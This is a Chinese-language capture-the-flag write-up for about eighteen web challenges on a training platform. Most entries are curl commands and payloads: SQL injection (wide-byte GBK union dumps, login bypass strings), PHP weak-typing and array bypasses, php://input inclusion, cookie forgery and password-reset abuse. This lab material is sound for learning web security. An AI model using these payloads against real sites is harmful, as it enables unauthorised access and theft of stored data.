## 1.pass_check
curl -X POST -d "pass[]=123" http://chinalover.sinaapp.com/web21/

## 2.file_get_content

curl -X POST -d "meizijiu" http://chinalover.sinaapp.com/web23/?file=php://input

## 3.起名字真难

不能有1-9中的数字且和54975581388弱类型相等,可以用十六进制，

curl -X GET http://chinalover.sinaapp.com/web12/index.php?key=0xccccccccc 

## 4.COOKIE

curl -b "Login=1" http://chinalover.sinaapp.com/web10/index.php -v

## 5.单身一百年也没用
curl http://chinalover.sinaapp.com/web9/index.php -v


## 6.aaencode

curl http://homura.cc/CGfiles/aaencode.txt

得到：
```
ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_');
```

解密：
alert("nctf{javascript_aaencode}")


## 7.md5 collision
QNKCDZO md5为0e开头
curl http://chinalover.sinaapp.com/web19/?a=s214587387a


## 8.这题不是Web
题目提示不是web题目，打开是张图片，可能是隐写术
下载下来后用strings命令即可


## 9.mysql
读robots.
sql.php爆破id，发现id=1023等时显示的内容为h4cked_By_w00dPeck3r，提交显示错误。
猜想可能id就是1024，但是有转义过滤。仔细看下过滤不完整，判断的是获取的id不是转义过滤后的id。
Poc:

curl "http://chinalover.sinaapp.com/web11/sql.php?id=1024.1"

## 10.bypass again

http://chinalover.sinaapp.com/web17/index.php?a[]=123&b[]=456


## 11. 变量覆盖

curl -X POST -d "thepassword_123=123&pass=123" http://chinalover.sinaapp.com/web18/index.php

## 12.GBK Injection
找到union注入点
http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%af%27%20union%20select%201,2%23

http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%af%27%20union%20select%201,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()%23
表ctf,ctf2,ctf3,ctf4,news

http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%af%27%20union%20select%201,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=0x637466%23

列user,pw,

http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%af%27%20union%20select%201,group_concat(user)%20from%20ctf%20%23
http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%af%27%20union%20select%201,group_concat(pw)%20from%20ctf%20%23
内容admin,nctf{h4cked_By_w00dPeck3r} 提交发现不对

再查
http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%af%27%20union%20select%201,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=0x63746632%23
列id,content
http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%af%27%20union%20select%201,group_concat(id)%20from%20ctf2%20%23
http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%af%27%20union%20select%201,group_concat(content)%20from%20ctf2%20%23

1020,1021,1022,1023,1024,1025
h4cked_By_w00dPeck3r,h4cked_By_w00dPeck3r,h4cked_By_w00dPeck3r,h4cked_By_w00dPeck3r,the flag is:nctf{query_in_mysql},h4cked_By_w00dPeck3r

再次提交提交仍然不对
再查
http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%af%27%20union%20select%201,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=0x63746634%23
列id,flag
http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%af%27%20union%20select%201,group_concat(flag)%20from%20ctf4%20%23
flag{this_is_sqli_flag}
仍然不对
爆了其他表后都发现不对，后来看了网上的writeup发现就应该是ctf4中的内容，这道题flag出问题了、


## 13.密码重置
curl -X POST -d "user=admin&newpass=123&vcode=1234&submit=重置" "http://nctf.nuptzj.cn/web13/index.php?user1=YWRtaW4=

考点，密码重置时没有验证身份或验证身份不够强，导致攻击者可以伪造身份修改其他人的密码。


## 14.sql injection

SELECT * FROM users WHERE name='' AND pass=''
要绕过登录可以几种方法：
- SELECT * FROM users WHERE name='admin'#' AND pass=''
- SELECT * FROM users WHERE name='admin' AND pass='123' or '1'
- SELECT * FROM users WHERE name='\' AND pass=' or 1#'

因为严格过滤了引号所以1，2方法不行
第三种方法时
username=\
pass= or 1%23
巧妙的拼接可以绕过
！！！其实stripslashes没有开启


### 15.SQL注入1
看下源码,关键语句：
```
$user = trim($_POST[user]);
$pass = md5(trim($_POST[pass]));
$sql="select user from ctf where (user='".$user."') and (pw='".$pass."')";
```

查询语句
select user from ctf where (user='') and (pw='')
所以只需：
select user from ctf where (user='admin')#') and (pw='')
账户名为admin')#
密码任意即可
即：
curl -X POST -d "user=admin')#&pass=1" "http://chinalover.sinaapp.com/index.php"


### 16.SQL注入2
关键代码：
```
$user = $_POST[user];
$pass = md5($_POST[pass]);
$query = @mysql_fetch_array(mysql_query("select pw from ctf where user='$user'"));
if (($query[pw]) && (!strcasecmp($pass, $query[pw]))) {
    echo "<p>Logged in! Key: ntcf{**************} </p>";
}
```
提示union查询，而且发现没有任何过滤
所以可以直接用
select pw from ctf where user='0' union select 'e10adc3949ba59abbe56e057f20f883e' as pw#
其中e10adc3949ba59abbe56e057f20f883e为123456的md5值
poc:
curl -X POST -d "user=0' union select 'e10adc3949ba59abbe56e057f20f883e' as pw#&pass=123456" "http://4.chinalover.sinaapp.com/web6/index.php"


### 17.密码重置2
题目提示了管理员邮箱：
admin@nuptzj.cn首页可找到（管理员邮箱和用户名经常是切入点）
根据提示vi退出交换文件：
curl http://nctf.nuptzj.cn/web14/.submit.php.swp
关键代码
```
如果登录邮箱地址不是管理员则 die()
if(!empty($token)&&!empty($emailAddress)){
        if(strlen($token)!=10) die('fail');
        if($token!='0') die('fail');
        $sql = "SELECT count(*) as num from `user` where token='$token' AND email='$emailAddress'";
        ...
}
```
token长度必须为10且弱类型等于0

SELECT count(*) as num from `user` where token='' or 123 #'AND email='admin@nuptzj.cn'  #fail

SELECT count(*) as num from `user` where token='a123456789'AND email='admin@nuptzj.cn'  #fail

SELECT count(*) as num from `user` where token='0000000000'AND email='admin@nuptzj.cn' #flag出现

后来想着'0'是字符串，a123456789也是字符串所以肯定不相等，而0000000000是数字转换为字符串后为0，如若是1234567890转换为字符串后为1234567890非1

至于为什么不能绕过查询语句尚且不知，估计题目做了一些过滤，毕竟只有部分源码

所以poc：
curl "http://nctf.nuptzj.cn/web14/submit.php?emailAddress=admin@nuptzj.cn&token=0000000000"

### 18.综合体
打开奇怪编码，做过的就知道是js fuck编码
直接js控制台运行出现：
1bc29b36f623ba82aaf6724fd3b16718.php
访问后发现上当了